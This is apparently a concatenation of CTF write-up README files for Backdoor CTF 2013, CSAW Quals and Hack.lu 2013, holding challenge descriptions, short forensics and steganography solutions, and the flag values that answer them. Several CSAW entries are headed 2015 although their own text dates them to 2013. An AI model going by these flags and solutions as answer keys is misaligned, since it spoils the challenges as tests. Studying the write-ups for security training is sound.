> He challenges you to find the text he has encrypted and promises to reward you handsomely if you manage to do so. To make things simpler he has also given you the hint that the text he has encrypted is only alphanumeric.
> 
> 
> The text encrypted using the above algorithm is: 
> 
> <pre>168 232 100 162 135 179 112 100 173 206 106 123 106 195 179 157 123 173</pre> 
> 
> 
> The flag is the MD5 of the decrypted text. 
> 
> 
> HINT: Sometimes the most direct approach gives the answer

## Write-up

(TODO)

## Other write-ups and resources

* none yet# Backdoor CTF 2013: Crypto 75

**Category:** Crypto
**Points:** 75
**Solves:** 
**Description:** 

> Decrypt this string 'RIVXR ITWZV OHVFM HVBMV HFVHC GLHEG RZHVR VS'
> 
> Flag is the MD5 of decoded string.
> 
> May the Force be with you !
> 
> HINT: Wait a sec! was that Force or Source!

## Write-up

(TODO)

## Other write-ups and resources

* none yet# Backdoor CTF 2013: Forensics 150

**Category:** Forensics
**Points:** 150
**Solves:** 
**Description:** 

> H4x0r decided he needs one more extra layer of advanced security. His access key is a QR code, and keeps the only copy in his wallet. But when leaving his castle he fell into the moat and the QR code got wet and disfigured. Now he cant get back into his own castle and desperately needs a real hacker's help. His post on craigslist says so. This is your chance to get into his head. 
> 
> Here is the disfigured QR code:-
> 
> The Flag is md5 of last 13 characters of password hidden in [the QR](wet_QR.png).
> 
> H4x0r promises to reward 150 h4x0rcoins anyone who gives him the password.
> 
> HINT: Hmmm... Can't I just try and reverse the fading somehow?

## Write-up

(TODO)

## Other write-ups and resources

* none yet# Backdoor CTF 2013: Forensics 250

**Category:** Forensics
**Points:** 250
**Solves:** 
**Description:** 

> h4x0r is fed up with all your attacks on his castle and has decided to retaliate by attacking us back. He sent us a mail with [this image](bbb.png) as a warning. Hope you can figure out his warning message:-
> 
> MD5 of the message is the answer.

## Write-up

We are given a picture:

![](bbb.png)

Using `stegsolve`, we see that this picture contains a hidden binary text:

![](solved.bmp)

Extract these bits and convert them to `0`s and `1`s with this [script](get.py):

```bash
$ python get.py
011011010110111101100100011001010111001001101110011101110110000101110010011001100110000101110010011001010000000000000000000000000000
```

We convert the binary output to ASCII text using a small perl command and pipe the output to `xxd` to avoid scrambling our shell:

```bash
$ python get.py | perl -lpe '$_=pack"B*",$_' | xxd
0000000: 6d6f 6465 726e 7761 7266 6172 6500 0000  modernwarfare...
0000010: 000a
```

MD5 the resulting readable text and you got the flag:

```bash
$ echo modernwarfare | md5
3c87b2bc2f0e1143ecb67aa8570ffc1b
$ echo -n modernwarfare | md5
d2432052b887f9e09fb8fa44b11861ef
```

The flag is either `3c87b2bc2f0e1143ecb67aa8570ffc1b` or `d2432052b887f9e09fb8fa44b11861ef`.
## Other write-ups and resources

* none yet# Backdoor CTF 2013: Forensics 300

**Category:** Forensics
**Points:** 300
**Solves:** 
**Description:** 

> H4x0r has now learnt that simple text authentications are not the in thing today. Also since voice authentication is all the rage nowadays thanx to siri, he decided to get one for his castle. But he messed it big time and now has a audio file which he himself can't seem to decipher. So now he needs your help to get into his own castle. 
> 
> You can find the file [here](siri_audio.zip).
> 
> Find the hidden passphrase, the flag is the MD5 of the passphrase.
>
> HINT: It is a audioWAVE. Sometimes you might have to see things instead of hearing them.

## Write-up

This writeup is based on [h34dump](http://h34dump.com/2013/03/backdoorctf-2013-forensics-300/)'s writeup.

We are given an audiowave file and open it with `audacity` and see this waveform:

![](writeup.png)

We see that there are six 16 spikes/ 8 sin waves and imply that we can decode the waves:

![](0.png)

as `0`

and

![](1.png)

as `1`.

This results in the bitstream `011000100110000101101011011001000110111101110010`, which can be translated into ASCII characters using a simple perl command:


```bash
$ echo 011000100110000101101011011001000110111101110010 | perl -lpe '$_=pack"B*",$_'
bakdor
$ echo -n bakdor
e1b64df17443b51e3007fd3d5370dca1
```

The flag is `e1b64df17443b51e3007fd3d5370dca1`.

## Other write-ups and resources

* <http://h34dump.com/2013/03/backdoorctf-2013-forensics-300/># Backdoor CTF 2013 write-ups

* <http://backdoor.cognizance.org.in/>
* [Scoreboard](https://ctftime.org/event/72) or [here](scoreboard.txt)

## Completed write-ups

* [forensic/250](forensic/250)
* [forensic/300](forensic/300)

## External write-ups only

* [binary/50](binary/50)
* [binary/100](binary/100)

## Missing write-ups

* [binary/200](binary/200)
* [binary/500](binary/500)
* [crypto/250](crypto/250)
* [crypto/400](crypto/400)
* [crypto/75](crypto/75)
* [forensic/150](forensic/150)
# Contribution guide

Please take a moment to review this document in order to make the contribution process easy and effective for everyone involved.

## Adding a new write-up entry

1. Each CTF gets its own folder in the root of this repository. For example, ‘Foo Bar CTF 2015’ would get a folder named `foo-bar-ctf-2015`.
2. Every CTF challenge gets its own subfolder within that folder with an appendix indicating its value. For example, all files related to the ‘Foo Bar CTF 2015’ challenge named ‘Sucky sandbox’, which is worth `150` points, would be located in `foo-bar-ctf-2015/sucky-sandbox-150`.
3. Every CTF challenge folder needs a Markdown-formatted `README.md` file, e.g. `foo-bar-ctf-2015/sucky-sandbox-150/README.md`. This file contains any details about the challenge, the main write-up itself, and links to other write-ups and resources. The folder should also contain the source files needed to reproduce the challenge.
4. Once you’re done adding the entry or making your changes, submit a pull request using the GitHub web interface.
5. Finally, make sure you follow our committing rules

## Changing an existing entry

1. Feel free to make any changes you see fit. Add a link to a write-up on your blog, add missing source files, clarify explanations in the write-up, or — if you’ve found a better way to solve a challenge — simplify the existing solution.
2. Once you’re done, submit a pull request using the GitHub web interface.

## Committing rules
These rules exist to keep the repo maintainable and complete. Please consider following them.

1. Update the root `big-ctf/README.md` file, when adding a writeup to `big-ctf/task/`. We have three different sections:
	* `Completed write-ups` - Tasks, for which there is at least one local repo writeup (see the `Write-up` section of each task)
	* `External write-ups only` - Tasks, for which there is at least one external writeup (see the `Other write-ups and resources` section of each task, but no local writeup
	* `Missing write-ups` - Tasks, for which there are no writeups available (yet).
2. If there already exists a writeup in the `Write-up` section and you want to add another local writeup:
	- Add another `Alternative write-up` section above the `Other write-ups and resources` section
3. Do not add files that have a filesize bigger than 15MB to keep the repo relatively small. Upload the file instead to a service or reference it from somewhere else.
4. Consider following these [committing rules](https://atom.io/docs/latest/contributing#git-commit-messages). For this repo, we like to use these [emojis](http://www.emoji-cheat-sheet.com/):
	* :memo: when adding a writeup to the `Write-up` section of a task
	* :floppy_disk: when adding resources for a task, e.g. files or scripts
	* :link: when adding a writeup link to the `Other write-ups and resources` section of a task
	* :pill: when fixing broken links or corrupt Markup stuff
	* :books: when updating the structure of this repo or adding a ctf skeleton structure
	* :fire: when deleting files
5. If you want to add a new CTF directory/structure (skeleton) with as little trouble as possible, then consider using the `genctf.py` tool from [our tools repo](https://github.com/ctfs/write-ups-tools/)
# CSAW Quals CTF 2015: CSAWpad

**Category:** Crypto
**Points:** 100
**Solves:** 141
**Description:** 

> [csawpad.py](csawpad.py)

## Write-up

(TODO)

## Other write-ups and resources

* none yet# CSAW Quals CTF 2015: onlythisprogram

**Category:** Crypto
**Points:** 300
**Solves:** 127
**Description:** 

> [onlythisprogram.tgz](onlythisprogram.tgz)

## Write-up

(TODO)

## Other write-ups and resources

* none yet# CSAW Quals CTF 2015: slurp

**Category:** Crypto
**Points:** 500
**Solves:** 27
**Description:** 

> We've found the source to the Arstotzka spies rendevous server, we must find out their new vault key.
>
> [slurp.py](slurp.py)
>
> nc 128.238.66.222 7788

## Write-up

(TODO)

## Other write-ups and resources

* none yet# CSAW Quals CTF 2015: CSAW Diary

**Category:** Exploitation
**Points:** 300
**Solves:** 116
**Description:** 

> nc 128.238.66.217 34266
>
> [fil_chal](fil_chal)

## Write-up

(TODO)

## Other write-ups and resources

* none yet# CSAW Quals CTF 2015: Exploitation 1

**Category:** Exploitation
**Points:** 100
**Solves:** 701
**Description:** 

> nc 128.238.66.212 31337
>
> [exploit1](exploit1)
>
> [exploit1.c](exploit1.c)

## Write-up

(TODO)

## Other write-ups and resources

* none yet# CSAW Quals CTF 2015: Exploitation 200

**Category:** Exploitation
**Points:** 200
**Solves:** 198
**Description:** 

> nc 128.238.66.212 31338
>
> [exploit2](exploit2)

## Write-up

(TODO)

## Other write-ups and resources

* none yet# CSAW Quals CTF 2015: miteegashun

**Category:** Exploitation
**Points:** 400
**Solves:** 85
**Description:** 

> nc 128.238.66.221 5930
>
> [miteegashun](miteegashun)

## Write-up

(TODO)

## Other write-ups and resources

* none yet# CSAW Quals CTF 2015: SCP-hack

**Category:** Exploitation
**Points:** 500
**Solves:** 7
**Description:** 

> The SCP organization (http://128.238.66.211:45000) wants you to join, accept and see if you can take advantage of their interns sloppy coding and outdated browser.

## Write-up

(TODO)

## Other write-ups and resources

* none yet# CSAW Quals CTF 2015: Black & White

**Category:** Misc
**Points:** 100
**Solves:** 818
**Description:** 

> [chal.png](chal.png)

## Write-up

We are given a PNG that seems to be just white.

However, using a steganography tool like [stegsolve](https://aur.archlinux.org/packages/stegsolve/), we see the flag in the blue, red or green 0 pane:

![](key.png)

The flag is `key{forensics_is_fun}`.

## Other write-ups and resources

* none yet# CSAW Quals CTF 2015: deeeeeeaaaaaadbeeeeeeeeeef

**Category:** Misc
**Points:** 200
**Solves:** 224
**Description:** 

> [IMG_0707.png](IMG_0707.png)

## Write-up

We are given a corrupt PNG file:

```bash
$ file IMG_0707.png
IMG_0707.png: PNG image data, 3264 x 1681, 8-bit/color RGBA, non-interlaced
$ pngcheck IMG_0707.png
IMG_0707.png  CRC error in chunk IHDR (computed fcc410a8, expected c1d0b3e4)
ERROR: IMG_0707.png
```

Editing the CRC for the PNG in `hexedit` to the correct one, yields a valid PNG:

![](1.png)
![](2.png)
![](resized_for_repo.png)

The picture looks like it has been resized, however, given the unusual aspect ratio of `3264:1681 ~= 1.94:1`.
We see using `exiftool` that the picture is made with an iPhone 5:

```bash
$ exiftool IMG_0707.png
ExifTool Version Number         : 9.76
[...]
Source                          : iPhone 5
Software                        : 6.1.4
[...]
Image Size                      : 3264x1681
```

The usual ratio of picture made by an [iPhone 5 camera](http://en.wikipedia.org/wiki/IPhone#Screen_and_input) is around `16:9` or `4:3`, so we apply the ratio to the picture using `hexedit` and fix the resulting new CRC sum:

![](wxh_orig.png)
![](wxh_fixd.png)
```bash
$ pngcheck NEW.png
NEW.png  CRC error in chunk IHDR (computed f754da63, expected fcc410a8)
ERROR: NEW.png
```
![](crc_fixd.png)
![](flag.png)

The flag is `Key{TheISISPasswordIs}`.
## Other write-ups and resources

* none yet# CSAW Quals CTF 2015: Life

**Category:** Misc
**Points:** 300
**Solves:** 212
**Description:** 

> <http://en.wikipedia.org/wiki/Conways_Game_of_Life>
> 
> nc 128.238.66.216 45678

## Write-up

(TODO)

## Other write-ups and resources

* none yet# CSAW Quals CTF 2015: Networking 1

**Category:** Misc
**Points:** 50
**Solves:** 1004
**Description:** 

> [networking.pcap](networking.pcap)

## Write-up

We can find the flag in the tcpdump using `strings`:

```bash
$ file networking.pcap
networking.pcap: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 65535)
$ strings -a networking.pcap | sort | uniq

)&~
38400,38400
Login incorrect
Password: 
Ubuntu 12.04.2 LTS
XTERM
flag{d316759c281bf925d600be698a4973d5}
hockeyinjune-virtual-machine login: 
```

The flag is `flag{d316759c281bf925d600be698a4973d5}`.

## Other write-ups and resources

* none yet# CSAW Quals CTF 2015: Networking 2

**Category:** Misc
**Points:** 50
**Solves:** 864
**Description:** 

> [networking.pcap](networking.pcap)
> 
> [networking.pcap.process](networking.pcap.process)

## Write-up

We are given the same tcpdump as [network1-50](../network1-50/):

```bash
$ diff networking.pcap ../network1-50/networking.pcap
$ [...]
```

However, we are also given a `networking.pcap.process` file, which contains the flag:

```bash
$ strings -a networking.pcap.process | sort | uniq
flag{f9b43c9e9c05be5e08ea163007af5144}.exe
flag{f9b43c9e9c05be5e08ea163007af5144}.exe

flag{f9b43c9e9c05be5e08ea163007af5144}.exe!
flag{f9b43c9e9c05be5e08ea163007af5144}.exe"
flag{f9b43c9e9c05be5e08ea163007af5144}.exe$
flag{f9b43c9e9c05be5e08ea163007af5144}.exe%
flag{f9b43c9e9c05be5e08ea163007af5144}.exe'
flag{f9b43c9e9c05be5e08ea163007af5144}.exe(
flag{f9b43c9e9c05be5e08ea163007af5144}.exe*
flag{f9b43c9e9c05be5e08ea163007af5144}.exe+
flag{f9b43c9e9c05be5e08ea163007af5144}.exe-
flag{f9b43c9e9c05be5e08ea163007af5144}.exe/
flag{f9b43c9e9c05be5e08ea163007af5144}.exe0
flag{f9b43c9e9c05be5e08ea163007af5144}.exe1
flag{f9b43c9e9c05be5e08ea163007af5144}.exe2
flag{f9b43c9e9c05be5e08ea163007af5144}.exe3
flag{f9b43c9e9c05be5e08ea163007af5144}.exe5
flag{f9b43c9e9c05be5e08ea163007af5144}.exe7
flag{f9b43c9e9c05be5e08ea163007af5144}.exe8
flag{f9b43c9e9c05be5e08ea163007af5144}.exe:
flag{f9b43c9e9c05be5e08ea163007af5144}.exe;
flag{f9b43c9e9c05be5e08ea163007af5144}.exe<
flag{f9b43c9e9c05be5e08ea163007af5144}.exe=
flag{f9b43c9e9c05be5e08ea163007af5144}.exe?
```

The flag is `flag{f9b43c9e9c05be5e08ea163007af5144}`.

## Other write-ups and resources

* none yet# CSAW Quals CTF write-ups

* <https://ctf.isis.poly.edu/>
* [Scoreboard](https://ctftime.org/event/96) or [here](scoreboard.txt)
* [Number of solves per task](solves.txt)

## Completed write-ups

* [misc/black-and-white-100](misc/black-and-white-100)
* [misc/deeeeeeaaaaaadbeeeeeeeeeef-200](misc/deeeeeeaaaaaadbeeeeeeeeeef-200)
* [misc/network1-50](misc/network1-50)
* [misc/network2-50](misc/network2-50)

## External write-ups only

* none yet

## Missing write-ups

* [crypto/csawpad-100](crypto/csawpad-100)
* [crypto/onlythisprogram-300](crypto/onlythisprogram-300)
* [crypto/slurp-500](crypto/slurp-500)
* [exploitation/csawdiary-300](exploitation/csawdiary-300)
* [exploitation/exploit1-100](exploitation/exploit1-100)
* [exploitation/exploit2-200](exploitation/exploit2-200)
* [exploitation/miteegashun-400](exploitation/miteegashun-400)
* [exploitation/scp-hack-500](exploitation/scp-hack-500)
* [misc/life-300](misc/life-300)
* [reversing/bikinibonanza-150](reversing/bikinibonanza-150)
* [reversing/crackme-300](reversing/crackme-300)
* [reversing/csaw2013reversing1-100](reversing/csaw2013reversing1-100)
* [reversing/csaw2013reversing2-200](reversing/csaw2013reversing2-200)
* [reversing/dotnet-100](reversing/dotnet-100)
* [reversing/impossible-500](reversing/impossible-500)
* [reversing/keygenme-400](reversing/keygenme-400)
* [reversing/noobs-first-firmware-mod-500](reversing/noobs-first-firmware-mod-500)
* [web/cryptomatv2-400](web/cryptomatv2-400)
* [web/guess-harder-100](web/guess-harder-100)
* [web/herpderper-300](web/herpderper-300)
* [web/nevernote-200](web/nevernote-200)
* [web/widgetcorp-400](web/widgetcorp-400)# CSAW Quals CTF 2015: bikinibonanza

**Category:** Reversing
**Points:** 150
**Solves:** 316
**Description:** 

> [bikinibonanza.exe](bikinibonanza.exe)
> 
> If your key isn't working PM ColdHeat on IRC

## Write-up

(TODO)

## Other write-ups and resources

* none yet# CSAW Quals CTF 2015: crackme

**Category:** Reversing
**Points:** 300
**Solves:** 174
**Description:** 

> nc 128.238.66.218 54321
>
> [crackme](crackme)

## Write-up

(TODO)

## Other write-ups and resources

* none yet# CSAW Quals CTF 2015: CSAW Reversing 2013 1

**Category:** Reversing
**Points:** 100
**Solves:** 644
**Description:** 

> [csaw2013reversing1.exe](csaw2013reversing1.exe)

## Write-up

(TODO)

## Other write-ups and resources

* none yet# CSAW Quals CTF 2015: CSAW Reversing 2013 2

**Category:** Reversing
**Points:** 200
**Solves:** 357
**Description:** 

> [csaw2013reversing2.exe](csaw2013reversing2.exe)

## Write-up

(TODO)

## Other write-ups and resources

* none yet# CSAW Quals CTF 2015: DotNet

**Category:** Reversing
**Points:** 100
**Solves:** 662
**Description:** 

> [DotNetReversing.exe](DotNetReversing.exe)

## Write-up

(TODO)

## Other write-ups and resources

* none yet# CSAW Quals CTF 2015: Impossible

**Category:** Reversing
**Points:** 500
**Solves:** 82
**Description:** 

> WTF, his hp is over 9000! Beat the game to get your key.
>
> [impossible.nds](impossible.nds)

## Write-up

(TODO)

## Other write-ups and resources

* none yetkeygenme
========

keygenme challenge from csaw ctf 2013
# CSAW Quals CTF 2015: Keygenme

**Category:** Reversing
**Points:** 400
**Solves:** 100
**Description:** 

> nc 128.238.66.219 14549

## Write-up

(TODO)

## Other write-ups and resources

* none yet# CSAW Quals CTF 2015: Noobs First Firmware Mod

**Category:** Reversing
**Points:** 500
**Solves:** 40
**Description:** 

> N00b firmware modder says: "My first u-boot mod, there might be errors :("
>
> [noobs-first-firmware-mod.tgz](noobs-first-firmware-mod.tgz)

## Write-up

(TODO)

## Other write-ups and resources

* none yet# CSAW Quals CTF 2015: CryptoMatv2

**Category:** Web
**Points:** 400
**Solves:** 45
**Description:** 

> Cryptomat is back! You know the drill. Get the key from Dog.
>
> http://128.238.66.225

## Write-up

(TODO)

## Other write-ups and resources

* none yet# CSAW Quals CTF 2015: Guess Harder

**Category:** Web
**Points:** 100
**Solves:** 985
**Description:** 

> http://128.238.66.215

## Write-up

(TODO)

## Other write-ups and resources

* none yet# CSAW Quals CTF 2015: Herpderper

**Category:** Web
**Points:** 300
**Solves:** 89
**Description:** 

> [herpderper.apk](herpderper.apk)

## Write-up

(TODO)

## Other write-ups and resources

* none yet# CSAW Quals CTF 2015: Nevernote

**Category:** Web
**Points:** 200
**Solves:** 307
**Description:** 

> http://128.238.66.214
> from: Nevernote Admin <nevernoteadmin@nevernote.com>
> to: challenger@ctf.isis.poly.edu
> date: Thurs, Sep 19, 2013 at 3:05 PM
> subject: Help
> 
> Friend,
> Evil hackers have taken control of the Nevernote server and locked me out. While I'm working on restoring access, is there anyway you can get in to my account and save a copy of my notes? I know the system is super secure but if anybody can do it - its you.
> Thanks,
> Nevernote Admin

## Write-up

(TODO)

## Other write-ups and resources

* none yet# CSAW Quals CTF 2015: WidgetCorp

**Category:** Web
**Points:** 400
**Solves:** 99
**Description:** 

> http://128.238.66.224

## Write-up

(TODO)

## Other write-ups and resources

* none yet# Hack.lu CTF 2013: BREW'r'Y

**Category:** Crypto
**Points:** 350
**Author:** dwuid
**Description:**

> Finally, the robots managed to sneak into one of our breweries. I guess I won't have to explain how bad that really is. That darn non-physical ones even shutdown our login system. Shiny thing, advanced technology, all based on fingerprints. Been secure as hell. If only it was running. Well, basically, we're screwed.
> But wait, there's hope. Seems like they didn't shutdown our old login system. Backward compatibility's a bitch, eh? Unfortunately, we got like _zero_ knowledge about the protocol. I mean come on, the last time we used that thingy was like decades ago. If we are lucky, the old authentication method is buggy.
> So, I heard you're kinda smart? Have a look at it. We desperately need to get drunk^W supply. You'll find the old system at ctf.fluxfingers.net:1335. Good luck.
> 
> Hint: Data is - and is expected to be - compressed using zlib.
> Hint: The challenge text gives hints about the protocol involved. We updated it in order to reflect that fact.

## Write-up

None

## Other write-ups and resources

[More Smoked Leet Chicken](http://mslc.ctf.su/wp/hack-lu-2013-ctf-crypto-350-brewry)# Hack.lu CTF 2013: ECKA

**Category:** Crypto
**Points:** 100
**Author:** asante
**Description:**

> Hey you!
> Come over and help me, please. We discovered a strange key agreement protocol used on this server: ctf.fluxfingers.net:1330.
> They send a curve which they use later. But we think the robots are a bit UBER-cautious and do not use the curve's P. So they first exchange their public point with a technique we could not figure out. It looks like they do not need a public key for this step.
> Afterwards they use another technique to agree on a key which they ultimately use to send some encrypted password.
> 
> We need this last password to shut down the robo-factory on our way to the Oktoberfest.
> 
> Oh btw, the robots use AES-ECB for symmetric encryption.
> 
> Hint: He, we have the latest news for you. The first part of their strange key agreement was designed by the famous SHA-Robot Мир!
> For all robo hunters out there: Your quest-description was updated - check it!

## Write-up

None

## Other write-ups and resources

* [https://stratum0.org/blog/posts/2013/10/26/hack-dot-lu-2013-ecka](https://stratum0.org/blog/posts/2013/10/26/hack-dot-lu-2013-ecka)# Hack.lu CTF 2013: Geier's Lambda

**Category:** Crypto
**Points:** 200
**Author:** asante
**Description:**

> Hey!
> We need your help. Our agent found some details about a huge conspiracy. Looks like they wanna plant a bomb near the Oktoberfest's main fairground ride. But we have a good chance, to get the defusing-password. That's where you have to jump in. We managed to steal the encrypted password along with a decryption file. Our agent also started to work on it, but one of the robots caught him and now we are left-behind with his infos.
> 
> He found a collision on the real password but wasn't sure, if he can use that one. But, here is it: “Le1sRI6I” - perhaps you have better luck. He also found out, that the robots only use alphanumeric characters and that the collision is of the same length, than the real password. The last thing he told us is, that the defusing password must contain only printable characters.
> 
> Hope that helps you! And now hurry!
> 
> Here is your challenge: [pwd_check_c1f3479111a8770625e50b785b5e2f373d5bf929.hs](pwd_check_c1f3479111a8770625e50b785b5e2f373d5bf929.hs)

## Write-up

None

## Other write-ups and resources

* [http://balidani.blogspot.pt/2013/10/hacklu-ctf-crypto-200-geiers-lambda.html](http://balidani.blogspot.pt/2013/10/hacklu-ctf-crypto-200-geiers-lambda.html)# Hack.lu CTF 2013: Marvin is plain-Jane

**Category:** Crypto
**Points:** 100
**Author:** asante
**Description:**

> Hey mister super-duper robo-dabster. We need you to tell us, what Marvin is!
> 
> What we know:
> 
> Marvin is
> using brainpool p256r1.
> His friend is called meneze or something. Or was it van-stone?
> 
> What we heard:
> 
> (23372093078317551665216159139784413411806753229249201681647388827754827452856 : 1)
> 71164450240897430648972143714791734771985061339722673162401654668605658194656
> 12951693517100633909800921421096074083332346613461419370069191654560064909824
> What we need to know:
>
> What Marvin is

## Write-up

None

## Other write-ups and resources

* [https://stratum0.org/blog/posts/2013/10/26/hack-dot-lu-2013-marvin-is-plain-jane](https://stratum0.org/blog/posts/2013/10/26/hack-dot-lu-2013-marvin-is-plain-jane)# Hack.lu CTF 2013: Breznparadisebugmaschine

**Category:** Exploiting
**Points:** 500
**Author:** martin, flandy
**Description:**

> The robot forces modified our beloved Breznparadisebackmaschine. This machine stores our secret, traditional Brezn recipe. Yet, we forgot the last secret ingredient and cannot access the Breznparadisebackmaschine anymore. However, Brezn are crucial for our party, as only paradise Brezn provide us the nice and warm feeling in our guts.
> 
> We need you to recover the important ingredient! Here is everything we could remember from the recipe:
> 
> For The Dough
> 1 kg Plain White Flour (around 9 - 12 % protein)
> 260 ml milk (lukewarm)
> 260 ml water (lukewarm)
> 80 g Butter (unsalted)
> 1 tbsp malt extract (liquid or dried, or brown sugar)
> 2 tsp fast action dried yeast (or 42g fresh if using)
> 2 tbsp Salt (unrefined)
> For The Finishing Solution
> 1 L Water
> 3 tbsp Baking Soda (or lye if your using it)
> Secret Ingredient
> 
> Please, we need to know that ingredient to make everyone happy again! 
[Brezelparadisebackmaschine_a731629098abf1629fcd04683d65ac87ff6e7bef.exe](Brezelparadisebackmaschine_a731629098abf1629fcd04683d65ac87ff6e7bef.exe)
> ctf.fluxfingers.net:1340
> Brezelparadisebackmaschinefirmware: Windows 2012
> 
> Announcements:
> Ah, perhaps it helps you to know, that our Breznparadisebugmaschinefirmware is up to date with Windows 2012.

## Write-up

None

## Other write-ups and resources

None# Hack.lu CTF 2013: Robotic Superiority

**Category:** Exploiting
**Points:** 250
**Author:** lama
**Description:**

> Help us fight the evil robotic lieutenant Don Sim. He wants to spread robo propaganda to cover his actions on the Oktoberfest. But he needs good video footage for that. So he created an IRC bot that collects information about robots in movies. Robotic emancipation can NOT happen, you have to stop him! All we need is his private key. Our agents located the bot, here is all we know about it:
> 
> Server: irc://ctf.fluxfingers.net:1313 
> Bot: lib[1-5] (load balancer) 
> Key: /var/private/key.txt 
> 
> Hint: All available commands are listed with "help". 3 connections allowed per ip.

## Write-up

None

## Other write-ups and resources

* [http://secgroup.ext.dsi.unive.it/2013/10/25/hack-lu-2013-ctf-write-up-robotic-superiority](http://secgroup.ext.dsi.unive.it/2013/10/25/hack-lu-2013-ctf-write-up-robotic-superiority)# Hack.lu CTF 2013: Wannabe

**Category:** Exploiting
**Points:** 400
**Author:** r1cky
**Description:**

> One of our informants met a guy who calls himself Elite Arthur, he is a real jackass, and he thinks he is the best hacker alive. We got reason to believe that the robots hired him to write the firmwares for their weapons. But to write such a firmware we need the key to sign the code. Luckily for us, our informant also found his website: …. your job is to hack the server, find the flag and show this little cocksucker how skilled he really is. We count on you.
> Here is your challenge: https://ctf.fluxfingers.net:1317. Alternatively, you can reach the challenge without a reverse proxy but also without SSL here: http://ctf.fluxfingers.net:1339
> 
> Announcement: Okay you can stop struggling now: XSS is not the way; leave the http cookie alone; get RIP to do the final trick!

## Write-up

None

## Other write-ups and resources

* [https://stratum0.org/blog/posts/2013/10/25/hack-dot-lu-2013-wannabe](https://stratum0.org/blog/posts/2013/10/25/hack-dot-lu-2013-wannabe)
* [https://www.arneswinnen.net/2013/11/hack-lu-2013-ctf-wannabe-writeup-part-one-web-exploitation](https://www.arneswinnen.net/2013/11/hack-lu-2013-ctf-wannabe-writeup-part-one-web-exploitation)
# Hack.lu CTF 2013: Packed

**Category:** Internals
**Points:** 200
**Author:** freddyb
**Description:**

> We just found a dead robot. It seems there is some useful data left but somehow it got confused with other data and now we don't know what's useful and what's junk. We just know there is only one way to go but there are many dead ends.
> Here is the challenge: [packed_7245b354be136111061c9a118d6304598f46c767](packed_7245b354be136111061c9a118d6304598f46c767)
>
> Announcements:
> Think outside the box - being several types at once like an animal that can change its color. Excuse the inaccuracy, but that's what you're searching for.

## Write-up

None

## Other write-ups and resources

* [https://hexpresso.wordpress.com/2013/10/24/hack-lu-ctf-2013-internals-200-packed-write-up](https://hexpresso.wordpress.com/2013/10/24/hack-lu-ctf-2013-internals-200-packed-write-up)# Hack.lu CTF 2013: Robot Plans

**Category:** Internals
**Points:** 150
**Author:** DrunkenPanda
**Description:**

> We have captured a robot from behind, while he dropped some cooling liquid into the bushes. We tried to interrogate the robot, but he still refuses to speak. Luckily we could extract files from the android's communication module. Hopefully we get some information about the robots' motives, before every information is swiped away...
> Here is the challenge: [https://ctf.fluxfingers.net/static/downloads/max_404/image.tar.gz](https://ctf.fluxfingers.net/static/downloads/max_404/image.tar.gz)

## Write-up

None

## Other write-ups and resources

* [https://stratum0.org/blog/posts/2013/10/26/hack-dot-lu-2013-robot-plans](https://stratum0.org/blog/posts/2013/10/26/hack-dot-lu-2013-robot-plans)
* [https://thufirhowatt.wordpress.com/hack-lu-ctf-robot-plans-writeup](https://thufirhowatt.wordpress.com/hack-lu-ctf-robot-plans-writeup)# Hack.lu CTF 2013: What's wrong with this?

**Category:** Internals
**Points:** 250
**Author:** javex
**Description:**

> We managed to get this package of the robots servers. We managed to determine that it is some kind of compiled bytecode. But something is wrong with it. Our usual analysis failed - so we have to hand this over to you pros. We only know this: The program takes one parameter and it responds with "Yup" if you have found the secret code, with "Nope" else. We expect it should be obvious how to execute it.
> Here is the challenge: [hello_977bc5b1a5856337e3b8f88dec5d7186b4acd16d.tar.gz](hello_977bc5b1a5856337e3b8f88dec5d7186b4acd16d.tar.gz)

## Write-up

None

## Other write-ups and resources

* [http://secgroup.ext.dsi.unive.it/2013/10/27/hack-lu-2013-ctf-write-up-whats-wrong-with-this](http://secgroup.ext.dsi.unive.it/2013/10/27/hack-lu-2013-ctf-write-up-whats-wrong-with-this)# Hack.lu CTF 2013: Beer Pump Filtration

**Category:** Misc
**Points:** evaluated
**Author:** FluxFingers
**Description:**

> Our agents observed that the famous robot Bender is part of the robot forces. Somehow he looked pregnant but his big belly is now gone. We fear that they might have smuggled some of Benders freshly brewed BenderBräu into our beer supplies. This is why we need brave women and men to test whether BenderBräu can cause severe damage on the human body or not, to avoid poisoning the whole party. But you have to test quick! Everyone is thirsty!
> 
> For testing you need to drink 0.5 liter of beer, preferably wheat beer, as fast as you can.
> 
> Make a video of your brave tasting and hand it in. The video must contain a proof of the current date. Show to us the totally secure and random Nonce "17" as well as your teamname written on... something. Also show us the closed beer bottle before, the empty after the tasting, and prove that it is 0.5 liters.
> 
> We will judge the score as follows:
> 
> Score = 100 Points - Seconds it takes to drink the beer
> 
> Bonuspoints for:
> Girls (Due to the law for gender equality we score women higher for the same effort)
> Dressing up like a robot or an Oktoberfest maid in her Dirndl
> Robo Dance
> Drinking Weizenbier (wheat beer)

## Write-up

None

## Other write-ups and resources

* [PPP](https://www.youtube.com/watch?v=Y473nQphv8Y)
* [BalalaikaCr3w](https://www.youtube.com/watch?v=Cl0dp4eL7qg)
* [Stratumauhuur](https://www.youtube.com/watch?v=hHoFBd5lpYY)# Hack.lu CTF 2013: For whom the bell tolls

**Category:** Misc
**Points:** 250
**Author:** Til
**Description:**

> To be frank, the impact partying robots had on the Oktoberfest in the recent years was disastrous. While the authorities have been able to downplay all recent incidents in the press (which habitually tends to blame visitors from the U.S., Australia, Cologne, and other places, where proper beer can only be found by the initiated), they can no longer deny the problem. Several public safety and law enforcement agencies have joined forces to spoil the robot's fun. They have planned a massive crackdown on our fun-seeking robotic friends. Time and location are currently being communicated together with a passphrase. Our organization, Robots on Rampage (RoR), is determined to stop them from stopping our annual beer-tasting event. 
> A robot agent on location in Munich has dectected a transmission between timestamp 2013-10-19-20:21:42 and 2013-10-19-20:21:43. The precise beginning of the transmission is unknown. The agent was unable to decrypt the message content. Being not the smartest agent, he also disposed of the message capture. In the following we were able to determine the sender location and the Forensic Analysis Robot Team (FART) was able to retrieve the session key and a initialization vector (IV). Judging from the memory fragments FART found, our best guess is that OpenSSL's AES implementation was used in one of the better modes to encrypt the communication. As the session key length is 128bit, the long term key is most probably longer. Due to time constraints we strongly advise against trying to break it. We have less confidence in the humans' ability to design proper communication protocols and services, though. However, we need a human to attack their logic. 
> 
